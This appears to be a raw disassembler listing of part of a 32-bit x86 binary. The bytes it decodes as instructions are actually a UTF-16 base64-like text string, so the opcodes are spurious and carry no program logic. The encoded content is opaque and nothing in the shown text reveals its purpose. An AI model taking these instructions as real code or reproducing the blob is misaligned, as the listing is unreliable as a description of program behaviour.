  409c42:	31 00                	xor    %eax,(%eax)
  409c44:	35 00 42 00 50       	xor    $0x50004200,%eax
  409c49:	00 67 00             	add    %ah,0x0(%edi)
  409c4c:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  409c4f:	00 4a 00             	add    %cl,0x0(%edx)
  409c52:	59                   	pop    %ecx
  409c53:	00 43 00             	add    %al,0x0(%ebx)
  409c56:	4f                   	dec    %edi
  409c57:	00 71 00             	add    %dh,0x0(%ecx)
  409c5a:	47                   	inc    %edi
  409c5b:	00 2f                	add    %ch,(%edi)
  409c5d:	00 52 00             	add    %dl,0x0(%edx)
  409c60:	41                   	inc    %ecx
  409c61:	00 42 00             	add    %al,0x0(%edx)
  409c64:	6e                   	outsb  %ds:(%esi),(%dx)
  409c65:	00 33                	add    %dh,(%ebx)
  409c67:	00 41 00             	add    %al,0x0(%ecx)
  409c6a:	57                   	push   %edi
  409c6b:	00 39                	add    %bh,(%ecx)
  409c6d:	00 77 00             	add    %dh,0x0(%edi)
  409c70:	48                   	dec    %eax
  409c71:	00 41 00             	add    %al,0x0(%ecx)
  409c74:	4f                   	dec    %edi
  409c75:	00 4f 00             	add    %cl,0x0(%edi)
  409c78:	62 00                	bound  %eax,(%eax)
  409c7a:	71 00                	jno    0x409c7c
  409c7c:	69 00 6d 00 37 00    	imul   $0x37006d,(%eax),%eax
  409c82:	69 00 73 00 51 00    	imul   $0x510073,(%eax),%eax
  409c88:	74 00                	je     0x409c8a
  409c8a:	69 00 59 00 2b 00    	imul   $0x2b0059,(%eax),%eax
  409c90:	58                   	pop    %eax
  409c91:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  409c95:	00 2b                	add    %ch,(%ebx)
  409c97:	00 6f 00             	add    %ch,0x0(%edi)
  409c9a:	41                   	inc    %ecx
  409c9b:	00 78 00             	add    %bh,0x0(%eax)
  409c9e:	37                   	aaa
  409c9f:	00 39                	add    %bh,(%ecx)
  409ca1:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  409ca5:	00 42 00             	add    %al,0x0(%edx)
  409ca8:	65 00 37             	add    %dh,%gs:(%edi)
  409cab:	00 4a 00             	add    %cl,0x0(%edx)
  409cae:	30 00                	xor    %al,(%eax)
  409cb0:	2f                   	das
  409cb1:	00 63 00             	add    %ah,0x0(%ebx)
  409cb4:	4b                   	dec    %ebx
  409cb5:	00 55 00             	add    %dl,0x0(%ebp)
  409cb8:	37                   	aaa
  409cb9:	00 48 00             	add    %cl,0x0(%eax)
  409cbc:	38 00                	cmp    %al,(%eax)
  409cbe:	56                   	push   %esi
  409cbf:	00 47 00             	add    %al,0x0(%edi)
  409cc2:	4c                   	dec    %esp
  409cc3:	00 4e 00             	add    %cl,0x0(%esi)
  409cc6:	77 00                	ja     0x409cc8
  409cc8:	6f                   	outsl  %ds:(%esi),(%dx)
  409cc9:	00 4c 00 30          	add    %cl,0x30(%eax,%eax,1)
  409ccd:	00 69 00             	add    %ch,0x0(%ecx)
  409cd0:	4f                   	dec    %edi
  409cd1:	00 38                	add    %bh,(%eax)
  409cd3:	00 41 00             	add    %al,0x0(%ecx)
  409cd6:	38 00                	cmp    %al,(%eax)
  409cd8:	70 00                	jo     0x409cda
  409cda:	66 00 78 00          	data16 add %bh,0x0(%eax)
  409cde:	56                   	push   %esi
  409cdf:	00 2f                	add    %ch,(%edi)
  409ce1:	00 6f 00             	add    %ch,0x0(%edi)
  409ce4:	73 00                	jae    0x409ce6
  409ce6:	50                   	push   %eax
  409ce7:	00 6d 00             	add    %ch,0x0(%ebp)
  409cea:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  409cee:	63 00                	arpl   %eax,(%eax)
  409cf0:	6f                   	outsl  %ds:(%esi),(%dx)
  409cf1:	00 33                	add    %dh,(%ebx)
  409cf3:	00 37                	add    %dh,(%edi)
  409cf5:	00 4f 00             	add    %cl,0x0(%edi)
  409cf8:	42                   	inc    %edx
  409cf9:	00 37                	add    %dh,(%edi)
  409cfb:	00 4e 00             	add    %cl,0x0(%esi)
  409cfe:	54                   	push   %esp
  409cff:	00 68 00             	add    %ch,0x0(%eax)
  409d02:	63 00                	arpl   %eax,(%eax)
  409d04:	75 00                	jne    0x409d06
  409d06:	69 00 49 00 65 00    	imul   $0x650049,(%eax),%eax
  409d0c:	63 00                	arpl   %eax,(%eax)
  409d0e:	58                   	pop    %eax
  409d0f:	00 77 00             	add    %dh,0x0(%edi)
  409d12:	35 00 37 00 41       	xor    $0x41003700,%eax
  409d17:	00 62 00             	add    %ah,0x0(%edx)
  409d1a:	69 00 74 00 73 00    	imul   $0x730074,(%eax),%eax
  409d20:	41                   	inc    %ecx
  409d21:	00 33                	add    %dh,(%ebx)
  409d23:	00 75 00             	add    %dh,0x0(%ebp)
  409d26:	47                   	inc    %edi
  409d27:	00 35 00 32 00 63    	add    %dh,0x63003200
  409d2d:	00 4d 00             	add    %cl,0x0(%ebp)
  409d30:	4d                   	dec    %ebp
  409d31:	00 61 00             	add    %ah,0x0(%ecx)
  409d34:	4f                   	dec    %edi
  409d35:	00 46 00             	add    %al,0x0(%esi)
  409d38:	72 00                	jb     0x409d3a
  409d3a:	38 00                	cmp    %al,(%eax)
  409d3c:	76 00                	jbe    0x409d3e
  409d3e:	76 00                	jbe    0x409d40
  409d40:	44                   	inc    %esp
  409d41:	00 38                	add    %bh,(%eax)
  409d43:	00 41 00             	add    %al,0x0(%ecx)
  409d46:	51                   	push   %ecx
  409d47:	00 33                	add    %dh,(%ebx)
  409d49:	00 39                	add    %bh,(%ecx)
  409d4b:	00 55 00             	add    %dl,0x0(%ebp)
  409d4e:	31 00                	xor    %eax,(%eax)
  409d50:	2f                   	das
  409d51:	00 62 00             	add    %ah,0x0(%edx)
  409d54:	59                   	pop    %ecx
  409d55:	00 47 00             	add    %al,0x0(%edi)
  409d58:	66 00 33             	data16 add %dh,(%ebx)
  409d5b:	00 46 00             	add    %al,0x0(%esi)
  409d5e:	33 00                	xor    (%eax),%eax
  409d60:	6f                   	outsl  %ds:(%esi),(%dx)
  409d61:	00 76 00             	add    %dh,0x0(%esi)
  409d64:	5a                   	pop    %edx
  409d65:	00 6a 00             	add    %ch,0x0(%edx)
  409d68:	77 00                	ja     0x409d6a
  409d6a:	33 00                	xor    (%eax),%eax
  409d6c:	62 00                	bound  %eax,(%eax)
  409d6e:	46                   	inc    %esi
  409d6f:	00 50 00             	add    %dl,0x0(%eax)
  409d72:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  409d76:	4f                   	dec    %edi
  409d77:	00 56 00             	add    %dl,0x0(%esi)
  409d7a:	56                   	push   %esi
  409d7b:	00 43 00             	add    %al,0x0(%ebx)
  409d7e:	7a 00                	jp     0x409d80
  409d80:	53                   	push   %ebx
  409d81:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d84:	6d                   	insl   (%dx),%es:(%edi)
  409d85:	00 33                	add    %dh,(%ebx)
  409d87:	00 6f 00             	add    %ch,0x0(%edi)
  409d8a:	31 00                	xor    %eax,(%eax)
  409d8c:	38 00                	cmp    %al,(%eax)
  409d8e:	46                   	inc    %esi
  409d8f:	00 63 00             	add    %ah,0x0(%ebx)
  409d92:	47                   	inc    %edi
  409d93:	00 72 00             	add    %dh,0x0(%edx)
  409d96:	47                   	inc    %edi
  409d97:	00 43 00             	add    %al,0x0(%ebx)
  409d9a:	68 00 4c 00 67       	push   $0x67004c00
  409d9f:	00 39                	add    %bh,(%ecx)
  409da1:	00 66 00             	add    %ah,0x0(%esi)
  409da4:	42                   	inc    %edx
  409da5:	00 31                	add    %dh,(%ecx)
  409da7:	00 48 00             	add    %cl,0x0(%eax)
  409daa:	68 00 38 00 72       	push   $0x72003800
  409daf:	00 6e 00             	add    %ch,0x0(%esi)
  409db2:	47                   	inc    %edi
  409db3:	00 62 00             	add    %ah,0x0(%edx)
  409db6:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  409db9:	00 59 00             	add    %bl,0x0(%ecx)
  409dbc:	65 00 35 00 70 00 74 	add    %dh,%gs:0x74007000
  409dc3:	00 33                	add    %dh,(%ebx)
  409dc5:	00 33                	add    %dh,(%ebx)
  409dc7:	00 6e 00             	add    %ch,0x0(%esi)
  409dca:	67 00 6d 00          	add    %ch,0x0(%di)
  409dce:	35 00 4d 00 32       	xor    $0x32004d00,%eax
  409dd3:	00 37                	add    %dh,(%edi)
  409dd5:	00 4f 00             	add    %cl,0x0(%edi)
  409dd8:	57                   	push   %edi
  409dd9:	00 2f                	add    %ch,(%edi)
  409ddb:	00 55 00             	add    %dl,0x0(%ebp)
  409dde:	56                   	push   %esi
  409ddf:	00 4a 00             	add    %cl,0x0(%edx)
  409de2:	6d                   	insl   (%dx),%es:(%edi)
  409de3:	00 53 00             	add    %dl,0x0(%ebx)
  409de6:	47                   	inc    %edi
  409de7:	00 49 00             	add    %cl,0x0(%ecx)
  409dea:	48                   	dec    %eax
  409deb:	00 33                	add    %dh,(%ebx)
  409ded:	00 65 00             	add    %ah,0x0(%ebp)
  409df0:	51                   	push   %ecx
  409df1:	00 6a 00             	add    %ch,0x0(%edx)
  409df4:	2b 00                	sub    (%eax),%eax
  409df6:	43                   	inc    %ebx
  409df7:	00 39                	add    %bh,(%ecx)
  409df9:	00 4d 00             	add    %cl,0x0(%ebp)
  409dfc:	4f                   	dec    %edi
  409dfd:	00 43 00             	add    %al,0x0(%ebx)
  409e00:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  409e04:	37                   	aaa
  409e05:	00 48 00             	add    %cl,0x0(%eax)
  409e08:	34 00                	xor    $0x0,%al
  409e0a:	78 00                	js     0x409e0c
  409e0c:	38 00                	cmp    %al,(%eax)
  409e0e:	33 00                	xor    (%eax),%eax
  409e10:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  409e14:	41                   	inc    %ecx
  409e15:	00 6b 00             	add    %ch,0x0(%ebx)
  409e18:	33 00                	xor    (%eax),%eax
  409e1a:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  409e1e:	6c                   	insb   (%dx),%es:(%edi)
  409e1f:	00 2b                	add    %ch,(%ebx)
  409e21:	00 4a 00             	add    %cl,0x0(%edx)
  409e24:	6d                   	insl   (%dx),%es:(%edi)
  409e25:	00 33                	add    %dh,(%ebx)
  409e27:	00 71 00             	add    %dh,0x0(%ecx)
  409e2a:	4c                   	dec    %esp
  409e2b:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  409e2f:	00 65 00             	add    %ah,0x0(%ebp)
  409e32:	39 00                	cmp    %eax,(%eax)
  409e34:	33 00                	xor    (%eax),%eax
  409e36:	59                   	pop    %ecx
  409e37:	00 48 00             	add    %cl,0x0(%eax)
  409e3a:	4e                   	dec    %esi
  409e3b:	00 2b                	add    %ch,(%ebx)
  409e3d:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  409e41:	00 43 00             	add    %al,0x0(%ebx)
  409e44:	39 00                	cmp    %eax,(%eax)
  409e46:	30 00                	xor    %al,(%eax)
  409e48:	38 00                	cmp    %al,(%eax)
  409e4a:	69 00 42 00 78 00    	imul   $0x780042,(%eax),%eax
  409e50:	53                   	push   %ebx
  409e51:	00 70 00             	add    %dh,0x0(%eax)
  409e54:	30 00                	xor    %al,(%eax)
  409e56:	55                   	push   %ebp
  409e57:	00 4b 00             	add    %cl,0x0(%ebx)
  409e5a:	4c                   	dec    %esp
  409e5b:	00 71 00             	add    %dh,0x0(%ecx)
  409e5e:	6a 00                	push   $0x0
  409e60:	31 00                	xor    %eax,(%eax)
  409e62:	77 00                	ja     0x409e64
  409e64:	4b                   	dec    %ebx
  409e65:	00 72 00             	add    %dh,0x0(%edx)
  409e68:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  409e6c:	70 00                	jo     0x409e6e
  409e6e:	44                   	inc    %esp
  409e6f:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  409e73:	00 71 00             	add    %dh,0x0(%ecx)
  409e76:	30 00                	xor    %al,(%eax)
  409e78:	71 00                	jno    0x409e7a
  409e7a:	68 00 61 00 69       	push   $0x69006100
  409e7f:	00 47 00             	add    %al,0x0(%edi)
  409e82:	75 00                	jne    0x409e84
  409e84:	6c                   	insb   (%dx),%es:(%edi)
  409e85:	00 6f 00             	add    %ch,0x0(%edi)
  409e88:	54                   	push   %esp
  409e89:	00 66 00             	add    %ah,0x0(%esi)
  409e8c:	71 00                	jno    0x409e8e
  409e8e:	6f                   	outsl  %ds:(%esi),(%dx)
  409e8f:	00 4d 00             	add    %cl,0x0(%ebp)
  409e92:	6f                   	outsl  %ds:(%esi),(%dx)
  409e93:	00 49 00             	add    %cl,0x0(%ecx)
  409e96:	4f                   	dec    %edi
  409e97:	00 33                	add    %dh,(%ebx)
  409e99:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  409e9d:	00 31                	add    %dh,(%ecx)
  409e9f:	00 4a 00             	add    %cl,0x0(%edx)
  409ea2:	35 00 6d 00 31       	xor    $0x31006d00,%eax
  409ea7:	00 4e 00             	add    %cl,0x0(%esi)
  409eaa:	79 00                	jns    0x409eac
  409eac:	32 00                	xor    (%eax),%al
  409eae:	4f                   	dec    %edi
  409eaf:	00 67 00             	add    %ah,0x0(%edi)
  409eb2:	7a 00                	jp     0x409eb4
  409eb4:	58                   	pop    %eax
  409eb5:	00 52 00             	add    %dl,0x0(%edx)
  409eb8:	2f                   	das
  409eb9:	00 2b                	add    %ch,(%ebx)
  409ebb:	00 31                	add    %dh,(%ecx)
  409ebd:	00 4b 00             	add    %cl,0x0(%ebx)
  409ec0:	73 00                	jae    0x409ec2
  409ec2:	34 00                	xor    $0x0,%al
  409ec4:	68 00 6d 00 37       	push   $0x37006d00
  409ec9:	00 4f 00             	add    %cl,0x0(%edi)
  409ecc:	6a 00                	push   $0x0
  409ece:	54                   	push   %esp
  409ecf:	00 47 00             	add    %al,0x0(%edi)
  409ed2:	46                   	inc    %esi
  409ed3:	00 52 00             	add    %dl,0x0(%edx)
  409ed6:	63 00                	arpl   %eax,(%eax)
  409ed8:	68 00 34 00 72       	push   $0x72003400
  409edd:	00 72 00             	add    %dh,0x0(%edx)
  409ee0:	4e                   	dec    %esi
  409ee1:	00 76 00             	add    %dh,0x0(%esi)
  409ee4:	67 00 36 00 4d       	add    %dh,0x4d00
  409ee9:	00 57 00             	add    %dl,0x0(%edi)
  409eec:	76 00                	jbe    0x409eee
  409eee:	32 00                	xor    (%eax),%al
  409ef0:	77 00                	ja     0x409ef2
  409ef2:	49                   	dec    %ecx
  409ef3:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ef6:	70 00                	jo     0x409ef8
  409ef8:	76 00                	jbe    0x409efa
  409efa:	35 00 32 00 41       	xor    $0x41003200,%eax
  409eff:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  409f03:	00 6b 00             	add    %ch,0x0(%ebx)
  409f06:	4c                   	dec    %esp
  409f07:	00 43 00             	add    %al,0x0(%ebx)
  409f0a:	62 00                	bound  %eax,(%eax)
  409f0c:	47                   	inc    %edi
  409f0d:	00 69 00             	add    %ch,0x0(%ecx)
  409f10:	6c                   	insb   (%dx),%es:(%edi)
  409f11:	00 2b                	add    %ch,(%ebx)
  409f13:	00 6f 00             	add    %ch,0x0(%edi)
  409f16:	78 00                	js     0x409f18
  409f18:	30 00                	xor    %al,(%eax)
  409f1a:	77 00                	ja     0x409f1c
  409f1c:	6c                   	insb   (%dx),%es:(%edi)
  409f1d:	00 39                	add    %bh,(%ecx)
  409f1f:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  409f23:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f26:	54                   	push   %esp
  409f27:	00 73 00             	add    %dh,0x0(%ebx)
  409f2a:	7a 00                	jp     0x409f2c
  409f2c:	76 00                	jbe    0x409f2e
  409f2e:	42                   	inc    %edx
  409f2f:	00 6b 00             	add    %ch,0x0(%ebx)
  409f32:	76 00                	jbe    0x409f34
  409f34:	44                   	inc    %esp
  409f35:	00 76 00             	add    %dh,0x0(%esi)
  409f38:	6d                   	insl   (%dx),%es:(%edi)
  409f39:	00 4f 00             	add    %cl,0x0(%edi)
  409f3c:	67 00 56 00          	add    %dl,0x0(%bp)
  409f40:	6d                   	insl   (%dx),%es:(%edi)
  409f41:	00 56 00             	add    %dl,0x0(%esi)
  409f44:	6f                   	outsl  %ds:(%esi),(%dx)
  409f45:	00 56 00             	add    %dl,0x0(%esi)
  409f48:	67 00 39             	add    %bh,(%bx,%di)
  409f4b:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  409f4f:	00 37                	add    %dh,(%edi)
  409f51:	00 50 00             	add    %dl,0x0(%eax)
  409f54:	39 00                	cmp    %eax,(%eax)
  409f56:	38 00                	cmp    %al,(%eax)
  409f58:	6d                   	insl   (%dx),%es:(%edi)
  409f59:	00 30                	add    %dh,(%eax)
  409f5b:	00 70 00             	add    %dh,0x0(%eax)
  409f5e:	68 00 6b 00 6c       	push   $0x6c006b00
  409f63:	00 2f                	add    %ch,(%edi)
  409f65:	00 50 00             	add    %dl,0x0(%eax)
  409f68:	5a                   	pop    %edx
  409f69:	00 53 00             	add    %dl,0x0(%ebx)
  409f6c:	4a                   	dec    %edx
  409f6d:	00 51 00             	add    %dl,0x0(%ecx)
  409f70:	4a                   	dec    %edx
  409f71:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  409f75:	00 4e 00             	add    %cl,0x0(%esi)
  409f78:	46                   	inc    %esi
  409f79:	00 70 00             	add    %dh,0x0(%eax)
  409f7c:	37                   	aaa
  409f7d:	00 70 00             	add    %dh,0x0(%eax)
  409f80:	63 00                	arpl   %eax,(%eax)
  409f82:	51                   	push   %ecx
  409f83:	00 4b 00             	add    %cl,0x0(%ebx)
  409f86:	62 00                	bound  %eax,(%eax)
  409f88:	47                   	inc    %edi
  409f89:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  409f8d:	00 56 00             	add    %dl,0x0(%esi)
  409f90:	4f                   	dec    %edi
  409f91:	00 70 00             	add    %dh,0x0(%eax)
  409f94:	54                   	push   %esp
  409f95:	00 48 00             	add    %cl,0x0(%eax)
  409f98:	6f                   	outsl  %ds:(%esi),(%dx)
  409f99:	00 66 00             	add    %ah,0x0(%esi)
  409f9c:	45                   	inc    %ebp
  409f9d:	00 5a 00             	add    %bl,0x0(%edx)
  409fa0:	58                   	pop    %eax
  409fa1:	00 49 00             	add    %cl,0x0(%ecx)
  409fa4:	52                   	push   %edx
  409fa5:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  409fa9:	00 55 00             	add    %dl,0x0(%ebp)
  409fac:	65 00 64 00 2f       	add    %ah,%gs:0x2f(%eax,%eax,1)
  409fb1:	00 2b                	add    %ch,(%ebx)
  409fb3:	00 6f 00             	add    %ch,0x0(%edi)
  409fb6:	55                   	push   %ebp
  409fb7:	00 78 00             	add    %bh,0x0(%eax)
  409fba:	6b 00 51             	imul   $0x51,(%eax),%eax
  409fbd:	00 4a 00             	add    %cl,0x0(%edx)
  409fc0:	4b                   	dec    %ebx
  409fc1:	00 67 00             	add    %ah,0x0(%edi)
  409fc4:	4b                   	dec    %ebx
  409fc5:	00 6f 00             	add    %ch,0x0(%edi)
  409fc8:	61                   	popa
  409fc9:	00 4d 00             	add    %cl,0x0(%ebp)
  409fcc:	72 00                	jb     0x409fce
  409fce:	32 00                	xor    (%eax),%al
  409fd0:	30 00                	xor    %al,(%eax)
  409fd2:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  409fd5:	00 59 00             	add    %bl,0x0(%ecx)
  409fd8:	39 00                	cmp    %eax,(%eax)
  409fda:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  409fde:	70 00                	jo     0x409fe0
  409fe0:	57                   	push   %edi
  409fe1:	00 2f                	add    %ch,(%edi)
  409fe3:	00 47 00             	add    %al,0x0(%edi)
  409fe6:	46                   	inc    %esi
  409fe7:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  409feb:	00 75 00             	add    %dh,0x0(%ebp)
  409fee:	34 00                	xor    $0x0,%al
  409ff0:	32 00                	xor    (%eax),%al
  409ff2:	62 00                	bound  %eax,(%eax)
  409ff4:	43                   	inc    %ebx
  409ff5:	00 35 00 77 00 31    	add    %dh,0x31007700
  409ffb:	00 49 00             	add    %cl,0x0(%ecx)
  409ffe:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40a002:	6f                   	outsl  %ds:(%esi),(%dx)
  40a003:	00 4d 00             	add    %cl,0x0(%ebp)
  40a006:	62 00                	bound  %eax,(%eax)
  40a008:	55                   	push   %ebp
  40a009:	00 61 00             	add    %ah,0x0(%ecx)
  40a00c:	44                   	inc    %esp
  40a00d:	00 5a 00             	add    %bl,0x0(%edx)
  40a010:	35 00 71 00 55       	xor    $0x55007100,%eax
  40a015:	00 56 00             	add    %dl,0x0(%esi)
  40a018:	6e                   	outsb  %ds:(%esi),(%dx)
  40a019:	00 6b 00             	add    %ch,0x0(%ebx)
  40a01c:	4b                   	dec    %ebx
  40a01d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a020:	4a                   	dec    %edx
  40a021:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40a025:	00 36                	add    %dh,(%esi)
  40a027:	00 6f 00             	add    %ch,0x0(%edi)
  40a02a:	4a                   	dec    %edx
  40a02b:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40a02f:	00 36                	add    %dh,(%esi)
  40a031:	00 48 00             	add    %cl,0x0(%eax)
  40a034:	50                   	push   %eax
  40a035:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a039:	00 4d 00             	add    %cl,0x0(%ebp)
  40a03c:	68 00 65 00 30       	push   $0x30006500
  40a041:	00 4d 00             	add    %cl,0x0(%ebp)
  40a044:	76 00                	jbe    0x40a046
  40a046:	70 00                	jo     0x40a048
  40a048:	75 00                	jne    0x40a04a
  40a04a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a04b:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40a04f:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40a053:	00 33                	add    %dh,(%ebx)
  40a055:	00 32                	add    %dh,(%edx)
  40a057:	00 45 00             	add    %al,0x0(%ebp)
  40a05a:	38 00                	cmp    %al,(%eax)
  40a05c:	41                   	inc    %ecx
  40a05d:	00 36                	add    %dh,(%esi)
  40a05f:	00 32                	add    %dh,(%edx)
  40a061:	00 55 00             	add    %dl,0x0(%ebp)
  40a064:	6f                   	outsl  %ds:(%esi),(%dx)
  40a065:	00 76 00             	add    %dh,0x0(%esi)
  40a068:	41                   	inc    %ecx
  40a069:	00 32                	add    %dh,(%edx)
  40a06b:	00 7a 00             	add    %bh,0x0(%edx)
  40a06e:	54                   	push   %esp
  40a06f:	00 39                	add    %bh,(%ecx)
  40a071:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40a075:	00 72 00             	add    %dh,0x0(%edx)
  40a078:	75 00                	jne    0x40a07a
  40a07a:	46                   	inc    %esi
  40a07b:	00 43 00             	add    %al,0x0(%ebx)
  40a07e:	71 00                	jno    0x40a080
  40a080:	79 00                	jns    0x40a082
  40a082:	70 00                	jo     0x40a084
  40a084:	50                   	push   %eax
  40a085:	00 51 00             	add    %dl,0x0(%ecx)
  40a088:	43                   	inc    %ebx
  40a089:	00 55 00             	add    %dl,0x0(%ebp)
  40a08c:	72 00                	jb     0x40a08e
  40a08e:	76 00                	jbe    0x40a090
  40a090:	59                   	pop    %ecx
  40a091:	00 35 00 58 00 6c    	add    %dh,0x6c005800
  40a097:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a09a:	69 00 54 00 72 00    	imul   $0x720054,(%eax),%eax
  40a0a0:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40a0a4:	56                   	push   %esi
  40a0a5:	00 49 00             	add    %cl,0x0(%ecx)
  40a0a8:	43                   	inc    %ebx
  40a0a9:	00 50 00             	add    %dl,0x0(%eax)
  40a0ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0ad:	00 56 00             	add    %dl,0x0(%esi)
  40a0b0:	30 00                	xor    %al,(%eax)
  40a0b2:	65 00 35 00 76 00 34 	add    %dh,%gs:0x34007600
  40a0b9:	00 62 00             	add    %ah,0x0(%edx)
  40a0bc:	32 00                	xor    (%eax),%al
  40a0be:	51                   	push   %ecx
  40a0bf:	00 56 00             	add    %dl,0x0(%esi)
  40a0c2:	45                   	inc    %ebp
  40a0c3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0c6:	64 00 64 00 4d       	add    %ah,%fs:0x4d(%eax,%eax,1)
  40a0cb:	00 2b                	add    %ch,(%ebx)
  40a0cd:	00 35 00 66 00 75    	add    %dh,0x75006600
  40a0d3:	00 41 00             	add    %al,0x0(%ecx)
  40a0d6:	45                   	inc    %ebp
  40a0d7:	00 53 00             	add    %dl,0x0(%ebx)
  40a0da:	31 00                	xor    %eax,(%eax)
  40a0dc:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a0e0:	63 00                	arpl   %eax,(%eax)
  40a0e2:	31 00                	xor    %eax,(%eax)
  40a0e4:	76 00                	jbe    0x40a0e6
  40a0e6:	78 00                	js     0x40a0e8
  40a0e8:	39 00                	cmp    %eax,(%eax)
  40a0ea:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40a0ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0ef:	00 6e 00             	add    %ch,0x0(%esi)
  40a0f2:	34 00                	xor    $0x0,%al
  40a0f4:	4b                   	dec    %ebx
  40a0f5:	00 2b                	add    %ch,(%ebx)
  40a0f7:	00 59 00             	add    %bl,0x0(%ecx)
  40a0fa:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40a0fe:	6d                   	insl   (%dx),%es:(%edi)
  40a0ff:	00 59 00             	add    %bl,0x0(%ecx)
  40a102:	4c                   	dec    %esp
  40a103:	00 48 00             	add    %cl,0x0(%eax)
  40a106:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40a10a:	50                   	push   %eax
  40a10b:	00 38                	add    %bh,(%eax)
  40a10d:	00 37                	add    %dh,(%edi)
  40a10f:	00 31                	add    %dh,(%ecx)
  40a111:	00 6b 00             	add    %ch,0x0(%ebx)
  40a114:	4f                   	dec    %edi
  40a115:	00 50 00             	add    %dl,0x0(%eax)
  40a118:	67 00 77 00          	add    %dh,0x0(%bx)
  40a11c:	66 00 38             	data16 add %bh,(%eax)
  40a11f:	00 41 00             	add    %al,0x0(%ecx)
  40a122:	58                   	pop    %eax
  40a123:	00 57 00             	add    %dl,0x0(%edi)
  40a126:	59                   	pop    %ecx
  40a127:	00 32                	add    %dh,(%edx)
  40a129:	00 6b 00             	add    %ch,0x0(%ebx)
  40a12c:	4a                   	dec    %edx
  40a12d:	00 79 00             	add    %bh,0x0(%ecx)
  40a130:	5a                   	pop    %edx
  40a131:	00 6b 00             	add    %ch,0x0(%ebx)
  40a134:	70 00                	jo     0x40a136
  40a136:	4d                   	dec    %ebp
  40a137:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40a13b:	00 46 00             	add    %al,0x0(%esi)
  40a13e:	45                   	inc    %ebp
  40a13f:	00 4f 00             	add    %cl,0x0(%edi)
  40a142:	52                   	push   %edx
  40a143:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a147:	00 50 00             	add    %dl,0x0(%eax)
  40a14a:	30 00                	xor    %al,(%eax)
  40a14c:	74 00                	je     0x40a14e
  40a14e:	45                   	inc    %ebp
  40a14f:	00 33                	add    %dh,(%ebx)
  40a151:	00 6b 00             	add    %ch,0x0(%ebx)
  40a154:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40a158:	5a                   	pop    %edx
  40a159:	00 75 00             	add    %dh,0x0(%ebp)
  40a15c:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a15f:	00 50 00             	add    %dl,0x0(%eax)
  40a162:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40a166:	33 00                	xor    (%eax),%eax
  40a168:	6a 00                	push   $0x0
  40a16a:	46                   	inc    %esi
  40a16b:	00 31                	add    %dh,(%ecx)
  40a16d:	00 61 00             	add    %ah,0x0(%ecx)
  40a170:	45                   	inc    %ebp
  40a171:	00 48 00             	add    %cl,0x0(%eax)
  40a174:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a178:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a17b:	00 72 00             	add    %dh,0x0(%edx)
  40a17e:	78 00                	js     0x40a180
  40a180:	46                   	inc    %esi
  40a181:	00 4e 00             	add    %cl,0x0(%esi)
  40a184:	63 00                	arpl   %eax,(%eax)
  40a186:	38 00                	cmp    %al,(%eax)
  40a188:	4c                   	dec    %esp
  40a189:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40a18d:	00 73 00             	add    %dh,0x0(%ebx)
  40a190:	57                   	push   %edi
  40a191:	00 36                	add    %dh,(%esi)
  40a193:	00 6a 00             	add    %ch,0x0(%edx)
  40a196:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a19a:	70 00                	jo     0x40a19c
  40a19c:	39 00                	cmp    %eax,(%eax)
  40a19e:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40a1a2:	49                   	dec    %ecx
  40a1a3:	00 5a 00             	add    %bl,0x0(%edx)
  40a1a6:	4c                   	dec    %esp
  40a1a7:	00 33                	add    %dh,(%ebx)
  40a1a9:	00 69 00             	add    %ch,0x0(%ecx)
  40a1ac:	56                   	push   %esi
  40a1ad:	00 6f 00             	add    %ch,0x0(%edi)
